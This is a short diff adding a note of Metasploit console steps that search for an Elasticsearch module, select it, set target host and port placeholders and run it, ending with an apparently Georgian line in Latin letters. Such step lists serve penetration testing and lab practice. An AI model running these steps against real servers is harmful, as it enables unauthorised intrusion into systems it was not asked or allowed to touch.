@@ -1,0 +1,9 @@
+msfconsole
+search elasticsearch
+use 3
+info
+set rhosts (ip)
+set rport (port)
+info
+run
+amoagdebs sadac shenaxulia
